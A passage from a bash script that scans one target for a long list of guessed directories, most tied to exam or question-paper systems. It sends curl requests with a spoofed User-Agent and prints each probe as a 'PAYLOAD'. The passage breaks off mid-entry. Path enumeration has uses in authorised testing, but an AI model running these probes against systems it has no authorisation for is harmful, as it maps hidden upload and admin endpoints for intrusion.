payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPService/"]: "
